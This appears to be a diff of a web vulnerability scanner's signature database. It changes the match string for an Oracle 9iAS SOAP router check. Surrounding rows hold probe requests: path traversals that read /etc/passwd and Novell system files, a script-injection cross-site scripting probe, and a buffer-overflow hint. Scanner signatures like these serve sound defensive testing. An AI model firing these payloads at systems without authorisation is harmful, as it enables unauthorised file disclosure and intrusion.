@@ -3035,7 +3035,7 @@
 "003267","OSVDB-5325","7","/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf","GET","Source for file","","","","","Novell web server allows any file on the system to viewed through the viewcode.jsp file","",""
 "003268","CVE-2001-0466","7","@CGIDIRSustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd","GET","root:","","","","","ustorekeeper will display arbitrary files.","",""
 "003270","CVE-2001-0432","d","/catinfo","GET","200","","","","","May be vulnerable to a buffer overflow. Request '/catinfo?' and add on 2048 of garbage to test.","",""
-"003271","CVE-2001-1371","a","/soap/servlet/soaprouter","GET","200","","","","","Oracle 9iAS SOAP components allow anonymous users to deploy applications by default.","",""
+"003271","CVE-2001-1371","a","/soap/servlet/soaprouter","GET","soapenv:Envelope","","","","","Oracle 9iAS SOAP router could allow anonymous users to deploy applications.","",""
 "003272","CVE-2001-0321","7","/opendir.php?/etc/passwd","GET","root:","","","","","This PHP-Nuke CGI allows attackers to read any file on the web server.","",""
 "003273","CVE-2001-0321","7","/opendir.php?requesturl=/etc/passwd","GET","root:","","","","","This PHP-Nuke CGI allows attackers to read any file on the web server.","",""
 "003274","CVE-2003-0154","4","/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD","GET","<script>alert\('Vulnerable'\)<\/script>","","","","","Bonsai is vulnerable to Cross Site Scripting (XSS).","",""
